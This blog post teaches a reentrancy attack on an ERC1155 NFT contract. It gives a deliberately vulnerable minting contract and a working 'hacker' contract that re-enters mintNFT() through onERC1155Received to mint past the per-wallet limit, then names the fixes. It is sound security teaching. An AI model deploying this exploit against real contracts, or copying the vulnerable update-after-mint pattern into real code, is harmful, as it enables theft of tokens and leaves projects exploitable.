---
published: true
Written By: Batman
---
## Attacking ERC1155's _mint function through ReEnterency

### Hi 

Most of you heard of  Ethereum Blockchain and NFT(Non-fungible Token). 

In terms of implementing a NFT on **Ethereum Blockchain** using **Solidity** language, there are two well defined and popular standards i.e **ERC721 and ERC1155**

We will be working on ERC1155 standard, implementing by **openzepplin**

Generally , in ERC1155 smart contract, There is a function which let users to mint NFT through a public website. A typical smart contract will look like 

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^ 0.8.7;

import "@openzeppelin/contracts/token/ERC1155/ERC1155.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/token/ERC1155/extensions/ERC1155Burnable.sol";


contract MySimpleErc1155 is ERC1155, ERC1155Burnable, Ownable {
    uint mintIdx ;
    string public name;
    string public symbol;
    uint maxMintperWallet = 10;
    mapping(address => uint ) perWalletMinttracker; 
    constructor() ERC1155("https://gateway.pinata.cloud/ipfs/"){
        name = "MYSIMPLE1155";
        symbol = "MS1155";
    }

    function mintNFT() public {
    	
    	// check if user has minted 10 NFT or not
        require(perWalletMinttracker[msg.sender] < maxMintperWallet, "Per wallet mint limit exceed");
        
        // if require condition pass then mint one NFT 
        _mint(msg.sender,1 , 1 , "");
        
        //increase mint counter for the user
        perWalletMinttracker[msg.sender]++;

    }

}

```



**MySimpleErc1155** contract is extending openzepplin's implementation of ERC1155. It has some standard variable like name , symbol which get assigned in the constructor. 

Important function and variables here is **mintNFT()**  and **maxMintPerWallet** . The `require (perWalletMinttracker[msg.sender] < maxMintperWallet, "Per wallet mint limit exceed");` is restricting the user to mint more than 10 NFT. And after a successful mint in ` _mint(msg.sender,1 , 1 , "");` , it increment the counter by one for the user  in the `perWalletMinttracker` .This perWalletMinttracker is used in **require** condition to check if the user has minted 10 NFT or not.

This is very common practice which I seen in many ERC1155 smart contract.  let's compile and deploy this smart contract and mint some NFT.

I will be using remix ide for the same. bekow is the screen shot after deployment of the contract

![1.png](https://github.com/gurus158/blogs/blob/gh-pages/post_images/2022-03-02-ReEnterency-Attack-In-ERC1155-NFT-Protocol/1.png?raw=true)

So when we call mintNFT() function , it will mint one NFT . I have called it 10 times. and when i call it 11th time from same account it throw me error `Per wallet mint limit exceed` , which is expected .

![2.png](https://github.com/gurus158/blogs/blob/gh-pages/post_images/2022-03-02-ReEnterency-Attack-In-ERC1155-NFT-Protocol/2.png?raw=true)

in image you can see , balance is 10 for the user, and when user try to mint 11th , transaction reverted.

But it is possible to bypass maxMintPerWallet limit for this smart contract. One can mint as many NFT as he wants.

In ERC1155 , minting is basically transfer of a token **from null addres to the address of the user want to mint** , and ERC1155 need to sure that receiver is willing to receive the token and  receiver has received the token. For that receiver need to be an ERC1155 holder and should have implemenataion of **onERC1155Received**() which return a sort of signal that it has received the token.

Now the problem is user can be a normal wallet or a smart contract. And if it's a smart contract it will implement **onERC1155Received()** . In it's implementation , it is possible to write any logic or even call mintNFT function of the original contract again and it will become a recursion.

As this contract updating **perWalletMinttracker** after callling **_mint()** , It is very possible to bypass   `require(perWalletMinttracker[msg.sender] < maxMintperWallet, "Per wallet mint limit exceed");` this check, because while calling mintNFT again in **onERC1155Received** , perwalletTracker is not updated yet. 

Let's exploit this vulnerability by creating another contract. code will look like below:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^ 0.8.7;
import "@openzeppelin/contracts/token/ERC1155/utils/ERC1155Holder.sol";

abstract contract MySimpleErc1155 {
    function mintNFT() public virtual;
}
contract hacker is ERC1155Holder{
    
    MySimpleErc1155 victimContract;

    constructor() {
        victimContract  = MySimpleErc1155(0xd9145CCE52D386f254917e481eB44e9943F39138);
    }
    uint iterations =12;

    function onERC1155Received(
        address,
        address,
        uint256,
        uint256,
        bytes memory
    ) public virtual override returns (bytes4) {
                iterations--;
        if (iterations==0)
        {return this.onERC1155Received.selector;}

        victimContract.mintNFT();
        return this.onERC1155Received.selector;
    }

    function mintN() public {
        victimContract.mintNFT();
    }
    }
```

I have extended ERC1155Holder in hacker contract. Also I have declared an abstract contract with mintNFT() function similar to actual **MySimpleErc1155**.

I have created 2 functions 

1. onERC1155Received --> override the actual implementation present in ERC1155Holder.sol
2. mintN --> simple function which call **MySimpleErc1155** 's  **mintNFT()**

If you see the **onERC1155Received** function above, I have added a if statement to only call mintNFT() 12 times i.e greater than 10.

let's compile and deploy this hacker contract.

![3.png](https://github.com/gurus158/blogs/blob/gh-pages/post_images/2022-03-02-ReEnterency-Attack-In-ERC1155-NFT-Protocol/3.png?raw=true)

You can see we have  mintN and couple of other functions available, which are implemented in ERC1155Holder.sol.

Now if I click mintN button on remix. hacker contract will be able to mint 12 NFTs.

We can confirm this by checking balanceOf function of **MySimpleErc1155** . 

![4.png](https://github.com/gurus158/blogs/blob/gh-pages/post_images/2022-03-02-ReEnterency-Attack-In-ERC1155-NFT-Protocol/4.png?raw=true)



So this is how Re-Enterency can be exploit . To save your contract from this vulnerability. It is recommended to do all required calculation before calling **_mint()** 

or using reEnterency guards available in [openzepplin](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/security/ReentrancyGuard.sol)
